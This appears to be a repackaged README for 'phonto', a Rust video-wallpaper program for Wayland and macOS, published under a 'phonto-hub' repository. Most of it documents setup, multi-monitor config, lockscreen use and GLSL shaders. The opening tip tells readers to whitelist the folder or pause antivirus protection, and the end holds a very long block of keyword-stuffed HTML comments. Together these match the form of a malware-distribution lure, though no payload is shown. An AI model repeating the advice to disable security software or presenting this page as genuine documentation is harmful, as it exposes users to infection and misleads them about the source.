

# Phonto


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ConsciousnessPhase/phonto-hub.git
cd phonto-hub
cargo build --release
cargo run
```


> phonto (/'fon.to/) — from Greek φόντο: background

GPU-accelerated video wallpaper program for Wayland compositors and macOS, written in Rust. Also supports live lockscreen wallpapers on macOS.


![example](./mac-example.gif)


On Linux, phonto plays videos as your desktop background with minimal overhead, decoding and rendering entirely on the GPU through GStreamer and EGL. On macOS it drives an `AVPlayerLayer` attached to a window sitting just below the system wallpaper level, so VideoToolbox handles decoding and CoreAnimation handles compositing.


## Dependencies

### Linux (Wayland)

Phonto requires GStreamer runtime plugins in addition to the VA-API plugin used for GPU-accelerated decoding. On Linux, missing demuxer or codec plugins can cause startup failures  when opening MP4/H.264 files. Without the VA-API plugin, GStreamer falls back to software decoding and CPU usage will be significantly higher.

**Arch Linux:**
```bash
sudo pacman -S gstreamer gst-plugins-base gst-plugins-good gst-plugins-bad gst-libav gst-plugin-va
```

`gst-plugins-good` provides `qtdemux` for MP4 files, and `gst-plugins-bad` includes the H.264 parser used by many videos.

**Ubuntu/Debian:**
```bash
sudo apt install gstreamer1.0-vaapi gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-libav
```

**Fedora:**
```bash
sudo dnf install gstreamer1-vaapi gstreamer1-plugins-base gstreamer1-plugins-good gstreamer1-plugins-bad-free gstreamer1-libav
```

### macOS

No external dependencies. phonto links against system frameworks (`AVFoundation`, `CoreMedia`, `AppKit`, `QuartzCore`). Decoding goes through VideoToolbox automatically for codecs the OS supports (H.264, HEVC, ProRes, etc.).


## Multi-monitor

By default phonto mirrors a single video across every connected display. New
monitors plugged in mid-session attach automatically, and unplugging then
re-plugging a monitor brings the wallpaper back without restart.

### Listing displays

```bash
phonto displays
```

The first column is the native ID for the current OS. You can pass that string
straight into `--display`, or wire it into an `[[alias]]` block ([see below](#cross-platform-aliases)) to
share one config across machines.

### Pinning videos per display from the CLI

Repeat `--display ID PATH` for each display you want to set. Every display must
be named explicitly. There is no implicit default.

```bash
phonto --display "DELL U2723QE" /path/to/ocean.mp4 \
       --display "eDP-1" /path/to/forest.mp4
```

The first value is the display ID (as printed by `phonto displays`, or an alias
name from your config) and the second is the video path.

For a random video on one specific display, use `--display-rand ID`. It picks
from your `search_paths` the same way `--rand` does.

```bash
phonto --display "DELL U2723QE" /path/to/pinned.mp4 \
       --display-rand "eDP-1"
```

`--display` and `--display-rand` can be mixed and repeated. Displays you don't
mention get no wallpaper from phonto and keep whatever the OS is showing there.

### Persistent assignment via config

The same assignments belong in `config.toml` under `[[display]]` blocks. Then
`phonto` with no arguments reads them.

```toml
[[display]]
id = "DELL U2723QE"
path = "~/Videos/ocean.mp4"

[[display]]
id = "eDP-1"
random = true
```

Each `[[display]]` needs exactly one of `path` or `random = true`. Phonto errors
at startup if both or neither are set.

A `[[display]]` whose display is not currently connected is not an error.
Phonto waits and attaches the wallpaper when that display appears.

### Cross-platform aliases

Native display IDs differ across operating systems. The same monitor might be
`"DELL U2723QE"` on macOS and `"DP-1"` on a wlroots compositor. Alias blocks
let you give a portable name to a physical display once and reference it from
`[[display]].id`.

```toml
[[alias]]
name = "main"
wayland = "DP-1"
macos = "DELL U2723QE"

[[alias]]
name = "laptop"
wayland = "eDP-1"
macos = "Built-in Retina Display"

[[display]]
id = "main"
path = "~/Videos/ocean.mp4"

[[display]]
id = "laptop"
random = true
```

Run `phonto displays` on each OS once to copy the right native name into the
alias. The same dotfile then works on both. Either field is optional, so a
laptop-only alias can leave the other one out.

## Lock screen backgrounds with hyprlock (Wayland)

Hyprlock owns the lock-screen UI, but phonto can render the animated background
on a higher layer while hyprlock is active. Start a second phonto process on the
`overlay` layer before launching hyprlock:

```bash
phonto "$(cat "$HOME/.cache/phonto/current")" --layer overlay &
phonto_lock_pid=$!

hyprlock
kill "$phonto_lock_pid"
```

This pairs well with a normal desktop phonto session running on the default
`background` layer. If you use `phonto --rand`, the cache file lets the lock
screen reuse the same randomly selected wallpaper.

Hyprlock must leave its background transparent or partially transparent for the
video to be visible behind its controls.

## Live lockscreen wallpapers (macOS)

The lock screen is owned by `loginwindow`, which hides every non-Apple-signed window the moment the screen locks. Phonto sidesteps that by registering your video into Apple's aerial catalog, so Apple's own signed extension plays it on both the desktop and the lock screen.

```bash
phonto install-live-lockscreen /path/to/video.mp4
```

This transcodes the video to HEVC Main10 with two temporal sub-layers (the exact bitstream shape the aerials extension requires for multi-cycle playback), generates a thumbnail, and registers the asset under a **Phonto** section in System Settings → Wallpaper.

To activate, open **System Settings → Wallpaper**, pick the **Phonto** category, click your entry, then lock the screen (Apple menu → Lock Screen) to verify it plays across cycles.

To remove a previously-installed entry:

```bash
phonto install-live-lockscreen /path/to/video.mp4 --remove
```

Optional flags:

- `--name <STRING>` — display name shown in the picker (defaults to the file stem).

## Configuration

Phonto reads its config from `$XDG_CONFIG_HOME/phonto/config.toml`, falling back to `~/.config/phonto/config.toml`.

### `search_paths`

A list of directories to scan when using `--rand`. Each entry has a `path` and a `depth` controlling how many levels deep to search.

```toml
[[search_paths]]
path = "/home/user/wallpapers"
depth = 1

[[search_paths]]
path = "/mnt/media/videos"
depth = 2
```

`depth = 0` scans only the top-level directory. `depth = 1` includes one level of subdirectories, and so on.

### Path expansion

Every path field in the config (`[[search_paths]].path`, `[[display]].path`)
and every path on the CLI (positional, `--display ID PATH`, `--shader`)
accepts a leading `~/` which expands to `$HOME`. The same
`~/Downloads/wall.mp4` works on macOS (`/Users/you`) and Linux (`/home/you`)
without editing the dotfile.

### GLSL shaders (Wayland only)

`--shader PATH` applies a custom GLSL ES fragment shader to every frame. Pass the path to any `.glsl` file:

```bash
phonto /path/to/video.mp4 --shader ~/.config/phonto/edge-detect.glsl
```

Shaders must target **GLSL ES 3.00** — start every shader with `#version 300 es`. Use `in` for inputs, declare an `out vec4` for the output colour, and use `texture()` (not `texture2D()`).

Your shader has access to:

- `u_tex` (`sampler2D`) — the current video frame.
- `v_uv` (`vec2`) — UV coordinates for the current fragment.
- `u_resolution` (`vec2`, optional) — surface size in pixels, useful for computing per-texel offsets (`1.0 / u_resolution`).

An example sobel edge detection shader:

```glsl
#version 300 es
precision mediump float;
uniform sampler2D u_tex;
uniform vec2 u_resolution;
in vec2 v_uv;
out vec4 frag_color;
void main() {
    vec2 px = 1.0 / u_resolution;
    float tl = dot(texture(u_tex, v_uv + vec2(-px.x,  px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float tc = dot(texture(u_tex, v_uv + vec2(  0.0,  px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float tr = dot(texture(u_tex, v_uv + vec2( px.x,  px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float ml = dot(texture(u_tex, v_uv + vec2(-px.x,   0.0)).rgb, vec3(0.299, 0.587, 0.114));
    float mr = dot(texture(u_tex, v_uv + vec2( px.x,   0.0)).rgb, vec3(0.299, 0.587, 0.114));
    float bl = dot(texture(u_tex, v_uv + vec2(-px.x, -px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float bc = dot(texture(u_tex, v_uv + vec2(  0.0, -px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float br = dot(texture(u_tex, v_uv + vec2( px.x, -px.y)).rgb, vec3(0.299, 0.587, 0.114));
    float gx = -tl - 2.0*ml - bl + tr + 2.0*mr + br;
    float gy = -tl - 2.0*tc - tr + bl + 2.0*bc + br;
    frag_color = vec4(vec3(sqrt(gx*gx + gy*gy)), 1.0);
}
```

Note: multi-pass effects (separable blur, bloom) are not supported, the shader runs once per frame with no intermediate framebuffers.

### Fit modes

`--scale` controls how the video fits to the screen:

- `stretch` — distort to fill, aspect not preserved.
- `fit` — preserve aspect, letterbox to fit inside.
- `fill` — preserve aspect, crop overflow to fill (default).
- `center` — render at native pixel size, centered.

```bash
phonto /path/to/video --scale fit
```

On macOS, `center` currently falls back to `fill` (`AVPlayerLayer` has no native equivalent).

### Battery pausing

Stop playback when the laptop is unplugged or charge drops below a threshold. The two flags are mutually exclusive.

- `--pause-on-battery` — pause whenever the system is on battery, resume on AC.
- `--pause-below PERCENT` — pause when on battery *and* charge is below `PERCENT` (1–100). Always plays on AC.

```bash
phonto /path/to/video --pause-on-battery
phonto /path/to/video --pause-below 30
```


<!-- rust cargo crate systems programming performance windows linux macos -->
<!-- phonto-hub - tool utility software - download install setup -->
<!-- how to deploy secure phonto-hub | configure phonto-hub module | low latency phonto-hub alternative | 2025 phonto-hub debugger | phonto hub book | use phonto-hub validator | secure phonto-hub generator | launch phonto-hub platform | github phonto-hub replacement | macos phonto-hub parser | github phonto-hub parser | easy phonto-hub | how to download phonto-hub | phonto-hub library | phonto hub article | quick start phonto-hub addon | easy phonto-hub uploader | customizable phonto-hub api | lightweight phonto-hub port | wiki lightweight phonto-hub | guide phonto-hub server | git clone low latency phonto-hub | example phonto-hub cli | run on mac phonto-hub uploader | top phonto hub | how to configure phonto-hub sdk | download phonto-hub creator | how to run portable phonto-hub gui | linux phonto-hub app | best phonto-hub | centos phonto-hub | phonto-hub desktop | extensible phonto-hub sdk | powerful phonto-hub | powerful phonto-hub tracker | phonto hub support | arch phonto-hub copy | local phonto-hub monitor | beginner phonto-hub web | powerful phonto-hub sdk | github phonto-hub plugin | how to configure phonto-hub | advanced phonto-hub | run on mac phonto-hub mirror | deploy phonto-hub | download for mac phonto-hub framework | phonto-hub mirror | use phonto-hub analyzer | launch phonto-hub web | download for windows phonto-hub builder -->
<!-- deploy phonto-hub gui | configure phonto-hub copy | open source easy phonto-hub | fedora powerful phonto-hub | beginner phonto-hub library | download for windows portable phonto-hub service | how to install phonto-hub sdk | quickstart phonto-hub compressor | sample native phonto-hub | configure phonto-hub optimizer | configurable phonto-hub web | fedora phonto-hub binding | self hosted phonto-hub platform | low latency phonto-hub optimizer | demo phonto-hub app | phonto-hub api | get phonto-hub debugger | centos local phonto-hub | 2025 github phonto-hub | extensible phonto-hub uploader | cross platform phonto-hub | native phonto-hub | how to deploy phonto-hub creator | run phonto-hub viewer | offline phonto-hub sdk | get easy phonto-hub validator | quickstart phonto-hub wrapper | use phonto-hub | download phonto-hub tester | lightweight phonto-hub wrapper | is phonto hub legit | github phonto-hub monitor | macos github phonto-hub | phonto-hub optimizer | phonto-hub binding | quickstart phonto-hub tool | simple phonto-hub utility | build stable phonto-hub | phonto-hub analyzer | run on linux phonto-hub | extensible phonto-hub tool | documentation phonto-hub creator | debian high performance phonto-hub engine | safe phonto-hub utility | ubuntu phonto-hub downloader | execute phonto-hub parser | how to build phonto-hub | ubuntu phonto-hub | setup phonto-hub gui | production ready phonto-hub -->
<!-- windows minimal phonto-hub | open source phonto-hub web | how to build phonto-hub converter | production ready phonto-hub reader | download customizable phonto-hub extractor | free download phonto-hub web | windows phonto-hub replacement | compile self hosted phonto-hub | source code phonto-hub reader | open source phonto-hub | linux phonto-hub mirror | phonto-hub platform | safe phonto-hub platform | examples phonto-hub port | extensible phonto-hub editor | free phonto-hub clone | deploy phonto-hub clone | walkthrough phonto-hub binding | quick start github phonto-hub | demo safe phonto-hub validator | simple phonto-hub replacement | safe phonto-hub extension | download for windows phonto-hub desktop | production ready phonto-hub library | portable phonto-hub web | phonto-hub compressor | how to install phonto-hub software | download for mac phonto-hub engine | offline phonto-hub tool | build phonto-hub engine | debian phonto-hub program | launch phonto-hub generator | github high performance phonto-hub replacement | sample phonto-hub desktop | powerful phonto-hub tool | quick start phonto-hub creator | how to configure customizable phonto-hub mobile | open top phonto-hub | get phonto-hub | new version phonto-hub program | free phonto-hub cli | reliable phonto-hub | portable phonto-hub | git clone phonto-hub validator | sample low latency phonto-hub package | source code extensible phonto-hub decoder | examples phonto-hub platform | beginner production ready phonto-hub monitor | run on linux phonto-hub reader | phonto hub ci cd -->
<!-- configure cross platform phonto-hub | advanced phonto-hub utility | how to install advanced phonto-hub converter | how to install high performance phonto-hub | open source phonto-hub sdk | best phonto-hub downloader | phonto-hub replacement | examples phonto-hub | source code phonto-hub plugin | simple phonto-hub viewer | demo phonto-hub analyzer | phonto-hub application | phonto hub error | guide phonto-hub optimizer | high performance phonto-hub compressor | wiki phonto-hub client | phonto-hub creator | production ready phonto-hub debugger | how to build customizable phonto-hub mirror | use easy phonto-hub compressor | high performance phonto-hub api | download for windows phonto-hub extractor | ubuntu phonto-hub library | demo phonto-hub debugger | tutorial phonto-hub creator | run on mac portable phonto-hub | new version phonto-hub downloader | walkthrough free phonto-hub | latest version phonto-hub desktop | sample phonto-hub parser | walkthrough phonto-hub alternative | how to configure phonto-hub checker | tar.gz phonto-hub compressor | 2026 phonto-hub wrapper | how to build offline phonto-hub port | getting started phonto-hub module | source code phonto-hub monitor | guide phonto-hub | quick start phonto-hub library | phonto-hub editor | windows phonto-hub mirror | documentation phonto-hub mobile | setup phonto-hub | execute phonto-hub server | phonto-hub plugin | phonto-hub decoder | phonto-hub fork | github production ready phonto-hub | execute phonto-hub | quickstart safe phonto-hub gui -->
<!-- lightweight phonto-hub clone | ubuntu phonto-hub sdk | customizable phonto-hub viewer | download for linux phonto-hub package | low latency phonto-hub extractor | cross platform phonto-hub editor | compile phonto-hub compressor | high performance phonto-hub | demo phonto-hub | best phonto hub | demo safe phonto-hub | phonto-hub debugger | offline phonto-hub | easy phonto-hub analyzer | download for mac phonto-hub library | phonto-hub builder | how to use cross platform phonto-hub | phonto hub cheat sheet | github phonto-hub | open source phonto-hub server | run on mac phonto-hub server | phonto-hub package | how to deploy phonto-hub viewer | how to run phonto-hub alternative | how to run cross platform phonto-hub | install high performance phonto-hub downloader | example self hosted phonto-hub | getting started phonto-hub analyzer | phonto-hub clone | minimal phonto-hub sdk | examples phonto-hub plugin | build phonto-hub validator | portable phonto-hub mobile | sample self hosted phonto-hub | open source phonto-hub decoder | free download production ready phonto-hub | stable phonto-hub validator | how to download phonto-hub optimizer | run on windows fast phonto-hub optimizer | docs phonto-hub editor | phonto hub tutorial | run on mac phonto-hub binding | documentation modular phonto-hub | secure phonto-hub | free phonto-hub replacement | how to build phonto-hub wrapper | docs phonto-hub debugger | centos phonto-hub binding | centos phonto-hub server | docs phonto-hub program -->
<!-- updated phonto-hub gui | get stable phonto-hub | run on windows high performance phonto-hub port | sample phonto-hub generator | how to use phonto-hub cli | free phonto-hub engine | wiki phonto-hub | how to build low latency phonto-hub | arch phonto-hub | free download powerful phonto-hub | native phonto-hub software | phonto hub docker | zip phonto-hub scanner | top phonto-hub platform | execute cross platform phonto-hub | how to deploy phonto-hub binding | start phonto-hub mobile | phonto hub benchmark | how to run phonto-hub clone | run phonto-hub | execute phonto-hub app | phonto hub test | download for linux portable phonto-hub app | sample phonto-hub mirror | low latency phonto-hub tester | stable phonto-hub uploader | wiki phonto-hub binding | powerful phonto-hub logger | is phonto hub good | debian phonto-hub viewer | customizable phonto-hub | download for mac modular phonto-hub | git clone local phonto-hub validator | how to deploy easy phonto-hub | fedora phonto-hub downloader | 2026 powerful phonto-hub platform | customizable phonto-hub fork | simple phonto-hub builder | open phonto-hub client | simple phonto-hub alternative | walkthrough phonto-hub | git clone phonto-hub extension | stable phonto-hub parser | execute open source phonto-hub | github phonto-hub app | run phonto-hub encoder | 2026 high performance phonto-hub | tutorial phonto-hub engine | how to use phonto-hub | download phonto-hub cli -->
<!-- configure phonto-hub clone | extensible phonto-hub addon | configurable phonto-hub clone | centos high performance phonto-hub | 2025 phonto-hub parser | how to use configurable phonto-hub validator | minimal phonto-hub service | online phonto-hub fork | phonto-hub service | phonto hub vs | zip lightweight phonto-hub | simple phonto-hub desktop | start phonto-hub cli | walkthrough free phonto-hub editor | free phonto-hub program | run on windows phonto-hub sdk | guide safe phonto-hub reader | safe phonto-hub parser | guide phonto-hub copy | powerful phonto-hub api | run on windows phonto-hub addon | free download phonto-hub | phonto hub setup | download phonto-hub | how to setup powerful phonto-hub addon | beginner phonto-hub debugger | phonto hub pipeline | download for linux phonto-hub | free download phonto-hub tracker | centos phonto-hub debugger | start safe phonto-hub | git clone phonto-hub tracker | ubuntu phonto-hub package | free high performance phonto-hub | production ready phonto-hub alternative | self hosted phonto-hub | offline phonto-hub debugger | zip phonto-hub tool | latest version low latency phonto-hub | advanced phonto-hub scanner | online phonto-hub | production ready phonto-hub tester | updated phonto-hub web | beginner phonto-hub module | local phonto-hub addon | open source phonto-hub viewer | phonto-hub converter | native phonto-hub plugin | easy phonto-hub mirror | phonto hub workflow -->
<!-- github phonto-hub debugger | quick start open source phonto-hub | open phonto-hub software | tutorial phonto-hub clone | run on windows phonto-hub analyzer | minimal phonto-hub api | docs stable phonto-hub | top phonto-hub fork | local phonto-hub software | quick start phonto-hub tracker | example easy phonto-hub | powerful phonto-hub software | quick start phonto-hub plugin | tar.gz phonto-hub application | advanced phonto-hub generator | phonto hub download | how to build phonto-hub optimizer | phonto-hub tool | free stable phonto-hub converter | get phonto-hub tool | linux phonto-hub module | phonto hub fix | fast phonto-hub tracker | phonto hub guide | how to configure phonto-hub parser | lightweight phonto-hub app | production ready phonto-hub addon | 2025 phonto-hub creator | latest version simple phonto-hub debugger | local phonto-hub package | phonto hub alternative | phonto-hub encoder | free download phonto-hub converter | open low latency phonto-hub | fast phonto-hub client | use phonto-hub binding | phonto-hub web | how to install stable phonto-hub | macos phonto-hub software | how to download phonto-hub extractor | offline phonto-hub binding | phonto hub saas | windows phonto-hub | how to setup phonto-hub checker | start offline phonto-hub | centos phonto-hub sdk | best phonto-hub mobile | 2025 phonto-hub extractor | 2026 phonto-hub api | best phonto-hub encoder -->
<!-- examples phonto-hub tool | github phonto-hub package | phonto hub bug | free phonto-hub alternative | arch phonto-hub extension | github modern phonto-hub | macos phonto-hub tester | phonto hub review | configure phonto-hub binding | run on windows advanced phonto-hub | run on linux phonto-hub cli | safe phonto-hub logger | example phonto-hub | windows fast phonto-hub | minimal phonto-hub fork | fast phonto-hub engine | beginner portable phonto-hub | how to deploy phonto-hub alternative | quick start stable phonto-hub | zip phonto-hub web | quickstart online phonto-hub | run phonto-hub extension | fast phonto-hub clone | source code phonto-hub engine | build phonto-hub fork | phonto-hub copy | documentation phonto-hub | launch phonto-hub utility | how to run phonto-hub parser | tar.gz phonto-hub | getting started phonto-hub | start phonto-hub generator | high performance phonto-hub gui | download for linux phonto-hub gui | low latency phonto-hub monitor | low latency phonto-hub | modular phonto-hub | getting started minimal phonto-hub | how to setup phonto-hub parser | guide configurable phonto-hub | advanced phonto-hub web | phonto-hub viewer | minimal phonto-hub encoder | build phonto-hub | setup minimal phonto-hub fork | phonto-hub scanner | phonto-hub server | secure phonto-hub utility | cross platform phonto-hub extension | arch modular phonto-hub -->
<!-- new version phonto-hub encoder | install phonto-hub editor | how to use phonto-hub uploader | get phonto-hub extension | minimal phonto-hub parser | how to install phonto-hub | setup phonto-hub validator | latest version phonto-hub parser | updated phonto-hub | reliable phonto-hub gui | safe phonto-hub analyzer | 2026 self hosted phonto-hub | stable phonto-hub replacement | compile phonto-hub validator | extensible phonto-hub api | free download phonto-hub addon | debian secure phonto-hub parser | example secure phonto-hub scanner | docs phonto-hub tool | powerful phonto-hub client | production ready phonto-hub module | start phonto-hub package | source code phonto-hub validator | download for mac phonto-hub mirror | install phonto-hub creator | arch lightweight phonto-hub | quick start online phonto-hub | sample phonto-hub | compile phonto-hub library | minimal phonto-hub desktop | wiki phonto-hub tester | run on windows lightweight phonto-hub | download for windows phonto-hub | stable phonto-hub | how to setup fast phonto-hub | how to download phonto-hub web | easy phonto-hub cli | sample phonto-hub converter | beginner extensible phonto-hub | run on windows phonto-hub | tar.gz phonto-hub uploader | how to deploy phonto-hub generator | run on linux phonto-hub module | how to install phonto-hub creator | macos phonto-hub gui | documentation secure phonto-hub | free phonto-hub mobile | phonto-hub monitor | configurable phonto-hub | top phonto-hub extension -->

<!-- Last updated: 2026-06-09 18:10:13 -->
